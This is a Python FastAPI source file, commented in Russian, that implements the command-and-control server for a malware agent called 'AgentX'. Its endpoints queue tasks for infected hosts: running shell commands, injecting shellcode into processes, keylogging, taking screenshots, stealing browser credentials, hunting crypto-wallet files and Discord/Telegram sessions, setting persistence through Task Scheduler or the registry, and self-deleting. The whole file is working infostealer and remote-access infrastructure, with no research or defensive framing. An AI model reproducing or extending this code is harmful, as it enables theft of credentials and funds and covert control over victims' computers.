from fastapi import FastAPI, HTTPException, Request, Body, Path, Query
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field
import time
import uuid
from typing import Dict, List, Any, Optional
import logging
import uvicorn

# Импортируем модели данных и типы команд
from src.agent_protocol.protocol import AgentInfo, Task, CommandType, C2Response

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('C2Server')

app = FastAPI(title="AgentX C2 Server", version="0.2.0")

# Хранилище данных агентов и задач (в памяти)
# TODO: Перейти на Redis или другую персистентную БД
agent_db: Dict[str, AgentInfo] = {}

# --- Вспомогательные функции ---

def create_task(agent_id: str, command: CommandType, params: Dict[str, Any] = {}) -> Optional[Task]:
    """Создает и добавляет новую задачу для агента"""
    if agent_id not in agent_db:
        return None
    
    agent = agent_db[agent_id]
    if agent.status == "offline":
        logger.warning(f"Cannot add task to offline agent {agent_id}")
        # Можно разрешить добавлять задачи оффлайн агентам, они выполнятся при следующем check-in
        # return None 
        pass # Позволим добавить
        
    task_id = str(uuid.uuid4())
    new_task = Task(
        task_id=task_id,
        command=command,
        params=params,
        status="pending",
        created_at=time.time()
    )
    agent.tasks[task_id] = new_task
    agent.last_checkin = time.time() # Обновляем время, чтобы показать активность
    logger.info(f"Task {task_id} ({command.value}) created for agent {agent_id}")
    return new_task

# --- Эндпоинты API C2 --- 

@app.post("/register", response_model=C2Response)
def register_agent(agent_info: Dict[str, Any] = Body(...)):
    """Регистрирует нового агента в системе"""
    agent_id = agent_info.get('agent_id')
    if not agent_id:
        agent_id = str(uuid.uuid4()) # Генерируем ID, если агент не предоставил
        logger.warning(f"Agent did not provide ID, generated new one: {agent_id}")

    if agent_id in agent_db:
        # Агент перезапускается или перерегистрируется
        logger.info(f"Agent {agent_id} re-registered.")
        agent_db[agent_id].status = "online"
        agent_db[agent_id].last_checkin = time.time()
        # Обновляем информацию, если она изменилась
        agent_db[agent_id].os = agent_info.get('os', agent_db[agent_id].os)
        agent_db[agent_id].hostname = agent_info.get('hostname', agent_db[agent_id].hostname)
        agent_db[agent_id].ip_address = agent_info.get('ip_address', agent_db[agent_id].ip_address)
        # Не сбрасываем задачи при перерегистрации
    else:
        # Новый агент
        logger.info(f"New agent registered: {agent_id}")
        new_agent = AgentInfo(
            agent_id=agent_id,
            os=agent_info.get('os', 'Unknown'),
            hostname=agent_info.get('hostname', 'Unknown'),
            ip_address=agent_info.get('ip_address', 'Unknown'),
            last_checkin=time.time(),
            status="online"
        )
        agent_db[agent_id] = new_agent
        
    return C2Response(status="success", message="Agent registered successfully", data={"agent_id": agent_id})

@app.post("/checkin/{agent_id}", response_model=List[Task])
def agent_checkin(agent_id: str = Path(...)):
    """Агент сообщает о своей активности и получает новые задачи"""
    if agent_id not in agent_db:
        logger.error(f"Check-in attempt from unknown agent ID: {agent_id}")
        raise HTTPException(status_code=404, detail="Agent not registered")
    
    agent = agent_db[agent_id]
    agent.last_checkin = time.time()
    agent.status = "online"
    logger.info(f"Agent {agent_id} checked in from {agent.ip_address}")
    
    # Находим задачи в статусе "pending"
    pending_tasks = [
        task for task in agent.tasks.values() if task.status == "pending"
    ]
    
    # Меняем статус выданных задач на "running"
    for task in pending_tasks:
        task.status = "running"
        task.updated_at = time.time()
        
    logger.info(f"Sending {len(pending_tasks)} tasks to agent {agent_id}")
    return pending_tasks

@app.post("/task_result/{agent_id}/{task_id}", response_model=C2Response)
def post_task_result(
    agent_id: str = Path(...),
    task_id: str = Path(...),
    result_data: Dict[str, Any] = Body(...)
):
    """Агент отправляет результат выполнения задачи"""
    if agent_id not in agent_db:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    agent = agent_db[agent_id]
    if task_id not in agent.tasks:
        raise HTTPException(status_code=404, detail="Task not found for this agent")
        
    task = agent.tasks[task_id]
    task.result = result_data.get('result')
    task.error = result_data.get('error')
    task.status = "completed" if not task.error else "failed"
    task.updated_at = time.time()
    agent.last_checkin = time.time() # Обновляем время
    
    logger.info(f"Received result for task {task_id} from agent {agent_id}. Status: {task.status}")
    if task.error:
        logger.error(f"Task {task_id} failed for agent {agent_id}: {task.error}")
        # Логируем часть результата при ошибке для отладки
        if task.result:
            log_result = str(task.result)[:200] # Ограничиваем длину лога
            logger.error(f"Task {task_id} partial result on failure: {log_result}...")
    # Опционально логируем успешный результат (может быть большим)
    # else:
    #    logger.debug(f"Task {task_id} successful result: {task.result}")
        
    return C2Response(status="success", message="Result received")

# --- Эндпоинты для управления агентами и задачами (для оператора/UI) ---

@app.get("/agents", response_model=List[AgentInfo])
def list_agents():
    """Возвращает список всех зарегистрированных агентов"""
    # Проверяем статус агентов по времени последнего check-in
    current_time = time.time()
    timeout_threshold = 300 # 5 минут неактивности = offline
    for agent in agent_db.values():
        if agent.status == "online" and current_time - agent.last_checkin > timeout_threshold:
            agent.status = "offline"
            logger.warning(f"Agent {agent.agent_id} marked as offline due to inactivity.")
            
    return list(agent_db.values())

@app.get("/agents/{agent_id}", response_model=AgentInfo)
def get_agent_details(agent_id: str = Path(...)):
    """Возвращает детальную информацию об агенте"""
    if agent_id not in agent_db:
        raise HTTPException(status_code=404, detail="Agent not found")
    return agent_db[agent_id]

@app.get("/agents/{agent_id}/tasks", response_model=List[Task])
def get_agent_tasks(agent_id: str = Path(...)):
    """Возвращает список задач для конкретного агента"""
    if agent_id not in agent_db:
        raise HTTPException(status_code=404, detail="Agent not found")
    return list(agent_db[agent_id].tasks.values())

@app.get("/agents/{agent_id}/tasks/{task_id}", response_model=Task)
def get_task_details(
    agent_id: str = Path(...),
    task_id: str = Path(...)
):
    """Возвращает детальную информацию о задаче"""
    if agent_id not in agent_db:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent = agent_db[agent_id]
    if task_id not in agent.tasks:
         raise HTTPException(status_code=404, detail="Task not found for this agent")
    return agent.tasks[task_id]

# --- Эндпоинты для создания задач --- 

class ShellCommandParams(BaseModel):
    command_line: str
    timeout: int = 60

@app.post("/agents/{agent_id}/execute_shell", response_model=Task)
def task_execute_shell(
    agent_id: str = Path(...),
    params: ShellCommandParams = Body(...)
):
    """Создает задачу выполнения shell-команды для агента"""
    task = create_task(agent_id, CommandType.EXECUTE_SHELL, params.dict())
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

class InjectShellcodeParams(BaseModel):
    target_process: str = Field(..., description="Full path or name of the target process, e.g., 'notepad.exe'")
    shellcode_b64: str = Field(..., description="Base64 encoded shellcode")

@app.post("/agents/{agent_id}/inject_shellcode", response_model=Task)
def task_inject_shellcode(
    agent_id: str = Path(...),
    params: InjectShellcodeParams = Body(...)
):
    """Создает задачу инъекции шеллкода для агента"""
    task = create_task(agent_id, CommandType.INJECT_SHELLCODE, params.dict())
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

@app.post("/agents/{agent_id}/system_info", response_model=Task)
def task_get_system_info(agent_id: str = Path(...)):
    """Создает задачу получения системной информации от агента"""
    task = create_task(agent_id, CommandType.GET_SYSTEM_INFO)
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

@app.post("/agents/{agent_id}/start_keylogger", response_model=Task)
def task_start_keylogger(agent_id: str = Path(...)):
    """Создает задачу запуска кейлоггера"""
    task = create_task(agent_id, CommandType.START_KEYLOGGER)
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

@app.post("/agents/{agent_id}/stop_keylogger", response_model=Task)
def task_stop_keylogger(agent_id: str = Path(...)):
    """Создает задачу остановки кейлоггера"""
    task = create_task(agent_id, CommandType.STOP_KEYLOGGER)
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

@app.post("/agents/{agent_id}/get_keylogs", response_model=Task)
def task_get_keylogs(agent_id: str = Path(...)):
    """Создает задачу получения логов кейлоггера"""
    task = create_task(agent_id, CommandType.GET_KEYLOGS)
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

@app.post("/agents/{agent_id}/screenshot", response_model=Task)
def task_screenshot(agent_id: str = Path(...)):
    """Создает задачу снятия скриншота"""
    task = create_task(agent_id, CommandType.SCREENSHOT)
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

@app.post("/agents/{agent_id}/steal_credentials", response_model=Task)
def task_steal_credentials(agent_id: str = Path(...)):
    """Создает задачу кражи учетных данных браузеров"""
    # Параметров пока нет, но можно добавить в будущем (например, выбор браузеров)
    task = create_task(agent_id, CommandType.STEAL_CREDENTIALS)
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

class ScanFilesParams(BaseModel):
    start_path: str = Field(..., description="Starting directory path for the scan (e.g., C:\\Users)")
    masks: str = Field(..., description="File masks separated by semicolon (e.g., *.wallet;*.seed;*.dat)")
    max_depth: int = Field(-1, description="Maximum recursion depth (-1 for unlimited)")

@app.post("/agents/{agent_id}/scan_files", response_model=Task)
def task_scan_files(
    agent_id: str = Path(...),
    params: ScanFilesParams = Body(...)
):
    """Создает задачу рекурсивного сканирования файлов по маске"""
    task = create_task(agent_id, CommandType.SCAN_FILES, params.dict())
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

class FindAppSessionsParams(BaseModel):
    app_names: str = Field(..., description="Application names separated by semicolon (e.g., Discord;Telegram)")

@app.post("/agents/{agent_id}/find_app_sessions", response_model=Task)
def task_find_app_sessions(
    agent_id: str = Path(...),
    params: FindAppSessionsParams = Body(...)
):
    """Создает задачу поиска файлов сессий приложений (Discord, Telegram)"""
    task = create_task(agent_id, CommandType.FIND_APP_SESSIONS, params.dict())
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

class PersistParams(BaseModel):
    method: str = Field(..., description="Persistence method ('taskscheduler' or 'registry')")
    name: str = Field(..., description="Task name or Registry value name")
    path: str = Field(..., description="Full path to the executable to persist")
    args: Optional[str] = Field(None, description="Command line arguments (only for taskscheduler)")

@app.post("/agents/{agent_id}/persist", response_model=Task)
def task_persist(
    agent_id: str = Path(...),
    params: PersistParams = Body(...)
):
    """Создает задачу установки персистентности для агента"""
    # Проверка метода
    if params.method not in ["taskscheduler", "registry"]:
         raise HTTPException(status_code=400, detail="Invalid persistence method specified.")
    
    task = create_task(agent_id, CommandType.PERSIST, params.dict())
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    return task

@app.post("/agents/{agent_id}/self_delete", response_model=Task)
def task_self_delete(agent_id: str = Path(...)):
    """Создает задачу самоудаления для агента"""
    # Параметров нет, агент сам должен знать путь к своему файлу (DLL)
    task = create_task(agent_id, CommandType.SELF_DELETE)
    if not task:
        raise HTTPException(status_code=404, detail="Agent not found or offline")
    # После этой команды агент должен скоро исчезнуть
    logger.warning(f"Self-delete task created for agent {agent_id}. Agent expected to go offline.")
    return task

# --- Запуск сервера --- 
if __name__ == "__main__":
    logger.info("Starting C2 server on 0.0.0.0:8000")
    # Запускаем uvicorn программно
    uvicorn.run(app, host="0.0.0.0", port=8000) 